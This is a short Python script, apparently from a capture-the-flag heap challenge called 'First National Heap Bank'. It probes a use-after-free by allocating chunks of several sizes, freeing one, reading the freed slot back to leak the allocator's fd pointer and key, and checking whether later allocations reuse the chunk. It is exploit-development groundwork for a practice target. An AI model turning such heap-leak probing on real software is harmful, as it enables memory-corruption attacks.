#!/usr/bin/env python3
import sys, struct
sys.path.insert(0, '/home/boss/Works/ctf/Zero_trace/First_nATIONAL_HEAP_bANK')
from bank import Bank, u64

for S in [0x408, 0x409, 0x410, 0x418, 0x4ff, 0x500]:
    try:
        b = Bank(timeout=8)
        b.open(0, S, b'C'*S)
        b.open(1, 0x20, b'G'*0x20)
        r = b.close(0)
        d = b.view(0)
        print(f'S={S:#x} after close first32={d[:32].hex()} fd={u64(d[:8]):#x} key={u64(d[8:16]):#x}')
        b.open(2, S, b'E'*S)
        d0 = b.view(0)
        d2 = b.view(2)
        print(f'   after new open: slot0 first16={d0[:16].hex()} slot2 first16={d2[:16].hex()} same={d0[:16]==d2[:16]}')
        b.s.close()
    except Exception as e:
        print(f'S={S:#x} ERR {type(e).__name__} {e}')
